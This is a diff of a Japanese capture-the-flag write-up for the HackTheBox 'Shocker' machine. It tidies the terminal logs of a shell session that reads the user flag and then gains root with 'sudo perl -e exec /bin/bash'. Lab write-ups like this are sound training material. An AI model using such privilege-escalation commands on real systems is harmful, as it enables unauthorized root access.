@@ -169,11 +169,9 @@ shelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm-256color
 shelly@Shocker:/usr/lib/cgi-bin$ stty rows 66 columns 236
 
 shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
-cat /home/shelly/user.txt
 20e038c019b7e9cc456d1666e4ad268e
 
 shelly@Shocker:/usr/lib/cgi-bin$ ls /root
-ls /root
 ls: cannot open directory '/root': Permission denied
 ```
 
@@ -193,7 +191,7 @@ perlでBashを起動、権限昇格成功！
 ルートフラグゲット
 ```sh
 shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash";'
-sudo perl -e 'exec "/bin/bash";'
+
 id
 uid=0(root) gid=0(root) groups=0(root)
 
